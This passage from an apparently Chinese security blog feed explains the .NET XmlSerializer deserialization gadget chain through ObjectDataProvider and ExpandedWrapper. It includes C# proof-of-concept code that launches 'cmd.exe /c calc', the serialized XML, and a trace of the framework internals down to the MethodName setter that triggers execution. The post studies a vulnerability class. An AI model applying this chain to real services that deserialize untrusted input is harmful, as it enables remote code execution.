info.AddValue(<span class="string">&quot;FontRenderingSize&quot;</span>, <span class="keyword">this</span>.FontRenderingEmSizeEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.FontRenderingEmSize));</span><br><span class="line">	info.AddValue(<span class="string">&quot;TextDecorations&quot;</span>, <span class="keyword">this</span>.TextDecorationsEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.TextDecorations));</span><br><span class="line">	info.AddValue(<span class="string">&quot;TextEffects&quot;</span>, <span class="keyword">this</span>.TextEffectsEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.TextEffects));</span><br><span class="line">	info.AddValue(<span class="string">&quot;CultureInfoName&quot;</span>, <span class="keyword">this</span>.CultureInfoEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.CultureInfo.Name));</span><br><span class="line">	info.AddValue(<span class="string">&quot;FontFamily&quot;</span>, <span class="keyword">this</span>.TypefaceEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.Typeface.FontFamily));</span><br><span class="line">	info.AddValue(<span class="string">&quot;Italic&quot;</span>, <span class="keyword">this</span>.ItalicEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.Italic));</span><br><span class="line">	info.AddValue(<span class="string">&quot;Bold&quot;</span>, <span class="keyword">this</span>.BoldEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.Bold));</span><br><span class="line">	info.AddValue(<span class="string">&quot;ForegroundOpacity&quot;</span>, <span class="keyword">this</span>.ForegroundOpacityEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.ForegroundOpacity));</span><br><span class="line">	info.AddValue(<span class="string">&quot;BackgroundOpacity&quot;</span>, <span class="keyword">this</span>.BackgroundOpacityEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.BackgroundOpacity));</span><br><span class="line">	<span class="built_in">bool</span> flag2 = !<span class="keyword">this</span>.TypefaceEmpty;</span><br><span class="line">	<span class="keyword">if</span> (flag2)</span><br><span class="line">	&#123;</span><br><span class="line">		info.AddValue(<span class="string">&quot;Typeface.Style&quot;</span>, XamlWriter.Save(<span class="keyword">this</span>.Typeface.Style));</span><br><span class="line">		info.AddValue(<span class="string">&quot;Typeface.Weight&quot;</span>, XamlWriter.Save(<span class="keyword">this</span>.Typeface.Weight));</span><br><span class="line">		info.AddValue(<span class="string">&quot;Typeface.Stretch&quot;</span>, XamlWriter.Save(<span class="keyword">this</span>.Typeface.Stretch));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为在<code>TextFormattingRunProperties</code>对象创建时第一个被获取的属性是<code>ForegroundBrush</code>，所以我们在创建<code>TextFormattingRunProperties</code>对象时可以将<code>ForegroundBrush</code>设置为我们的<code>Payload</code><br>&#96;</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>C# - 反序列化</tag>
        <tag>XmlSerializer</tag>
        <tag>BinaryFormatter</tag>
        <tag>TextFormattingRunProperties</tag>
      </tags>
  </entry>
  <entry>
    <title>从三味书屋到百草堂，从XmlSerializer到BinnaryFormatter之XmlSerializer反序列化漏洞ObjectDataProvider利用链</title>
    <url>/archives/ff457959.html</url>
    <content><![CDATA[<h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>我们先从<code>ObjectDataProvider</code>开始，有下面一段代码  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">			odp.ObjectInstance = <span class="keyword">new</span> Process();</span><br><span class="line">            odp.MethodParameters.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">            odp.MethodParameters.Add(<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当这段代码运行后会弹出计算机，那么命令行代码的执行时机是在哪呢，我们观察<code>ObjectDataProvider</code>的<code>MethodName</code>以及<code>MethodParameters</code>成员变量，发现<code>Methodname</code>存在<code>set</code>访问器<br>在<code>set</code>访问器中有一个if判断是否是延迟刷新，默认计算结果为<code>false</code>即会调用到<code>Refresh</code>方法  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">DefaultValue(null)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> MethodName</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">get</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> _methodName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span></span><br><span class="line">    &#123;</span><br><span class="line">        _methodName = <span class="keyword">value</span>;</span><br><span class="line">        OnPropertyChanged(<span class="string">&quot;MethodName&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">base</span>.IsRefreshDeferred)</span><br><span class="line">        &#123;</span><br><span class="line">            Refresh();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Refresh</code>方法最终会调用到<code>QueryWorker</code>方法，在<code>QueryWorker</code>方法中会调用到<code>InvokeMethodOnInstance</code>方法调用命令执行方法。  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Refresh</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    _initialLoadCalled = <span class="literal">true</span>;</span><br><span class="line">    BeginQuery();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">BeginQuery</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (TraceData.IsExtendedTraceEnabled(<span class="keyword">this</span>, TraceDataLevel.Attach))</span><br><span class="line">    &#123;</span><br><span class="line">        TraceData.Trace(TraceEventType.Warning, TraceData.BeginQuery(TraceData.Identify(<span class="keyword">this</span>), IsAsynchronous ? <span class="string">&quot;asynchronous&quot;</span> : <span class="string">&quot;synchronous&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IsAsynchronous)</span><br><span class="line">    &#123;</span><br><span class="line">        ThreadPool.QueueUserWorkItem(QueryWorker, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        QueryWorker(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">QueryWorker</span>(<span class="params"><span class="built_in">object</span> obj</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">object</span> obj2 = <span class="literal">null</span>;</span><br><span class="line">    Exception e = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (_mode == SourceMode.NoSource || _objectType == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (TraceData.IsEnabled)</span><br><span class="line">        &#123;</span><br><span class="line">            TraceData.Trace(TraceEventType.Error, TraceData.ObjectDataProviderHasNoSource);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        e = <span class="keyword">new</span> InvalidOperationException(SR.Get(<span class="string">&quot;ObjectDataProviderHasNoSource&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Exception e2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (_needNewInstance &amp;&amp; _mode == SourceMode.FromType)</span><br><span class="line">        &#123;</span><br><span class="line">            ConstructorInfo[] constructors = _objectType.GetConstructors();</span><br><span class="line">            <span class="keyword">if</span> (constructors.Length != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                _objectInstance = CreateObjectInstance(<span class="keyword">out</span> e2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            _needNewInstance = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(MethodName))</span><br><span class="line">        &#123;</span><br><span class="line">            obj2 = _objectInstance;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            obj2 = InvokeMethodOnInstance(<span class="keyword">out</span> e);</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span> &amp;&amp; e2 != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                e = e2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>InvokeMethodOnInstance</code>将会调用指定方法</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">object</span> <span class="title">InvokeMethodOnInstance</span>(<span class="params"><span class="keyword">out</span> Exception e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">object</span> result = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">string</span> text = <span class="literal">null</span>;</span><br><span class="line">    e = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">object</span>[] array = <span class="keyword">new</span> <span class="built_in">object</span>[_methodParameters.Count];</span><br><span class="line">    _methodParameters.CopyTo(array, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = _objectType.InvokeMember(MethodName, BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy | BindingFlags.InvokeMethod | BindingFlags.OptionalParamBinding, <span class="literal">null</span>, _objectInstance, array, CultureInfo.InvariantCulture);</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说<code>MethodName</code>变量的<code>set</code>访问器被触发时会调用<code>objectInstance</code>变量所指向对下个你的指定方法，方法名为<code>methodName</code>变量的值，参数为<code>MethodParameters</code>。<br><code>XmlSerializer</code>类在反序列化<code>xml</code>的时候会构造<code>ObjectDataProvider</code>对象，在对象构造的过程中会调用到其成员变量的<code>set</code>访问器为成员变量赋值从而触发命令执行。<br>只是这样是不够的，因为<code>ObjectDataProvider</code>对象并不能被<code>XmlSerializer</code>序列化。这个时候就需要<code>ExpandedWrapper</code>对<code>ObjectDataProvider</code>进行包装，另外即便<code>ObjectDataProvider</code>被包装后也是不能成功序列化的，<br>因为<code>ObjectProvider</code>的成员变量<code>ObjectInstance</code>是一个<code>Process</code>对象，因为该对象是不能被<code>XmlSerializer</code>序列化的。<br>我们可以先对命令执行的方法进行一下封装让其能够被序列化方便测试。<br>代码如下：  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">XmlRoot</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ProcessT</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exec</span>()</span></span><br><span class="line">	&#123;</span><br><span class="line">		Process process = <span class="keyword">new</span> Process();</span><br><span class="line">		process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">		process.StartInfo.Arguments = <span class="string">&quot;/c calc&quot;</span>;</span><br><span class="line">		process.Start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt;();</span><br><span class="line">            ObjectDataProvider object_data_provider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            object_data_provider.MethodName = <span class="string">&quot;exec&quot;</span>;</span><br><span class="line">            object_data_provider.ObjectInstance = <span class="keyword">new</span> ProcessT();</span><br><span class="line">            expandedWrapper.ProjectedProperty0 = object_data_provider;</span><br><span class="line">            XmlSerializer xml = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt;));</span><br><span class="line">            TextWriter text_writer = <span class="keyword">new</span> StreamWriter(<span class="string">@&quot;test.xml&quot;</span>);</span><br><span class="line">            xml.Serialize(text_writer, expandedWrapper);</span><br><span class="line">            text_writer.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这样被封装后就解决了<code>Process</code>不能被序列化的问题，那么<code>ExpandedWrapper</code>是如何解决<code>ObjectDataprovider</code>不能被序列化的问题的呢？<br>在<code>test.xml</code>中序列化的数据为  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ExpandedWrapperOfProcessTObjectDataProvider</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ObjectInstance</span> <span class="attr">xsi:type</span>=<span class="string">&quot;ProcessT&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">MethodName</span>&gt;</span>exec<span class="tag">&lt;/<span class="name">MethodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ExpandedWrapperOfProcessTObjectDataProvider</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>ExpandedWrapper</code>被编译的时候会自动生成一个程序集（咱也不知道是谁生成的，我看的文章是说在XmlSerializer在初始化的时候生成这个程序集），<br>这个程序集中包含两个类分别是 <code>XmlSerializationReaderExpandedWrapper2</code>以及<code>XmlSerializationWriterExpandedWrapper2</code>分别在<code>ExpanderWrapper</code>的序列化以及反序列化过程中被调用<br><img src="/archives/ff457959/0880c08b01109690e53a.png" alt="img1"><br>在反序列化过程中首先被调用的是<code>Read9_Item</code>方法<br><img src="/archives/ff457959/0880c08b011096908d3c.png" alt="img2"><br><code>Read9_Item</code>方法调用<code>Read8_Item</code>  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Read9_Item</span>()</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">object</span> result = <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">base</span>.Reader.MoveToContent();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.NodeType == XmlNodeType.Element)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.LocalName != <span class="keyword">this</span>.id1_Item || <span class="keyword">base</span>.Reader.NamespaceURI != <span class="keyword">this</span>.id2_Item)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">base</span>.CreateUnknownNodeException();</span><br><span class="line">				&#125;</span><br><span class="line">				result = <span class="keyword">this</span>.Read8_Item(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">base</span>.UnknownNode(<span class="literal">null</span>, <span class="string">&quot;:ExpandedWrapperOfProcessTObjectDataProvider&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p><code>Read8_Item</code>最终调用到<code>Read7_ObjectDataProvider</code>，看到这个名字联想到是否会创建<code>ObjectDataProvider</code>这样是否就会给其<code>objectInstance</code>以及<code>MehtodName</code>属性赋值从而触发命令执行？  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt; <span class="title">Read8_Item</span>(<span class="params"><span class="built_in">bool</span> isNullable, <span class="built_in">bool</span> checkType</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">			XmlQualifiedName xmlQualifiedName = checkType ? <span class="keyword">base</span>.GetXsiType() : <span class="literal">null</span>;</span><br><span class="line">			<span class="built_in">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">if</span> (isNullable)</span><br><span class="line">			&#123;</span><br><span class="line">				flag = <span class="keyword">base</span>.ReadNull();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (checkType)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (xmlQualifiedName != <span class="literal">null</span> &amp;&amp; (xmlQualifiedName.Name != <span class="keyword">this</span>.id1_Item || xmlQualifiedName.Namespace != <span class="keyword">this</span>.id2_Item))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">base</span>.CreateUnknownTypeException(xmlQualifiedName);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt; result;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">			&#123;</span><br><span class="line">				result = <span class="literal">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;ProcessT, ObjectDataProvider&gt;();</span><br><span class="line">				<span class="built_in">bool</span>[] array = <span class="keyword">new</span> <span class="built_in">bool</span>[<span class="number">3</span>];</span><br><span class="line">				<span class="keyword">while</span> (<span class="keyword">base</span>.Reader.MoveToNextAttribute())</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (!<span class="keyword">base</span>.IsXmlnsAttribute(<span class="keyword">base</span>.Reader.Name))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">base</span>.UnknownNode(expandedWrapper);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">base</span>.Reader.MoveToElement();</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.IsEmptyElement)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">base</span>.Reader.Skip();</span><br><span class="line">					result = expandedWrapper;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">base</span>.Reader.ReadStartElement();</span><br><span class="line">					<span class="keyword">base</span>.Reader.MoveToContent();</span><br><span class="line">					<span class="built_in">int</span> num = <span class="number">0</span>;</span><br><span class="line">					<span class="built_in">int</span> readerCount = <span class="keyword">base</span>.ReaderCount;</span><br><span class="line">					<span class="keyword">while</span> (<span class="keyword">base</span>.Reader.NodeType != XmlNodeType.EndElement &amp;&amp; <span class="keyword">base</span>.Reader.NodeType != XmlNodeType.None)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.NodeType == XmlNodeType.Element)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span> (!array[<span class="number">0</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id3_Description &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								expandedWrapper.Description = <span class="keyword">base</span>.Reader.ReadElementString();</span><br><span class="line">								array[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">1</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id4_ExpandedElement &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								expandedWrapper.ExpandedElement = <span class="keyword">this</span>.Read2_ProcessT(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">								array[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">2</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id5_ProjectedProperty0 &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								expandedWrapper.ProjectedProperty0 = <span class="keyword">this</span>.Read7_ObjectDataProvider(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">								array[<span class="number">2</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">base</span>.UnknownNode(expandedWrapper, <span class="string">&quot;:Description, :ExpandedElement, :ProjectedProperty0&quot;</span>);</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">base</span>.UnknownNode(expandedWrapper, <span class="string">&quot;:Description, :ExpandedElement, :ProjectedProperty0&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">base</span>.Reader.MoveToContent();</span><br><span class="line">						<span class="keyword">base</span>.CheckReaderCount(<span class="keyword">ref</span> num, <span class="keyword">ref</span> readerCount);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">base</span>.ReadEndElement();</span><br><span class="line">					result = expandedWrapper;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p><code>Read7_ObjectDataProvider</code>在为<code>MethodName</code>赋值时将会触发 <code>MehtodName</code>的<code>set</code>访问器 从而触发命令执行  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectDataProvider <span class="title">Read7_ObjectDataProvider</span>(<span class="params"><span class="built_in">bool</span> isNullable, <span class="built_in">bool</span> checkType</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">		...</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				ObjectDataProvider objectDataProvider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">				IList constructorParameters = objectDataProvider.ConstructorParameters;</span><br><span class="line">				IList methodParameters = objectDataProvider.MethodParameters;</span><br><span class="line">				<span class="built_in">bool</span>[] array = <span class="keyword">new</span> <span class="built_in">bool</span>[<span class="number">7</span>];</span><br><span class="line">				<span class="keyword">while</span> (<span class="keyword">base</span>.Reader.MoveToNextAttribute())</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (!<span class="keyword">base</span>.IsXmlnsAttribute(<span class="keyword">base</span>.Reader.Name))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">base</span>.UnknownNode(objectDataProvider);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">base</span>.Reader.MoveToElement();</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.IsEmptyElement)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">base</span>.Reader.Skip();</span><br><span class="line">					result = objectDataProvider;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">base</span>.Reader.ReadStartElement();</span><br><span class="line">					<span class="keyword">base</span>.Reader.MoveToContent();</span><br><span class="line">					<span class="built_in">int</span> num = <span class="number">0</span>;</span><br><span class="line">					<span class="built_in">int</span> readerCount = <span class="keyword">base</span>.ReaderCount;</span><br><span class="line">					<span class="keyword">while</span> (<span class="keyword">base</span>.Reader.NodeType != XmlNodeType.EndElement &amp;&amp; <span class="keyword">base</span>.Reader.NodeType != XmlNodeType.None)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.NodeType == XmlNodeType.Element)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span> (!array[<span class="number">0</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id7_IsInitialLoadEnabled &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="keyword">if</span> (<span class="keyword">base</span>.Reader.IsEmptyElement)</span><br><span class="line">								&#123;</span><br><span class="line">									<span class="keyword">base</span>.Reader.Skip();</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span></span><br><span class="line">								&#123;</span><br><span class="line">									objectDataProvider.IsInitialLoadEnabled = XmlConvert.ToBoolean(<span class="keyword">base</span>.Reader.ReadElementString());</span><br><span class="line">								&#125;</span><br><span class="line">								array[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">1</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id8_ObjectType &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">								objectDataProvider.ObjectType = <span class="keyword">this</span>.Read6_Type(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">								array[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">2</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id9_ObjectInstance &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">							<span class="comment">// 设置objectInstance属性值</span></span><br><span class="line">								objectDataProvider.ObjectInstance = <span class="keyword">this</span>.Read1_Object(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">								array[<span class="number">2</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span> <span class="keyword">if</span> (!array[<span class="number">3</span>] &amp;&amp; (<span class="keyword">base</span>.Reader.LocalName == <span class="keyword">this</span>.id10_MethodName &amp;&amp; <span class="keyword">base</span>.Reader.NamespaceURI == <span class="keyword">this</span>.id2_Item))</span><br><span class="line">							&#123;</span><br><span class="line">							<span class="comment">// 设置 MethodName属性值 将会触发 MehtodName的set访问器 从而触发命令执行</span></span><br><span class="line">								objectDataProvider.MethodName = <span class="keyword">base</span>.Reader.ReadElementString();</span><br><span class="line">								array[<span class="number">3</span>] = <span class="literal">true</span>;</span><br><span class="line">							&#125;</span><br><span class="line">				...</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
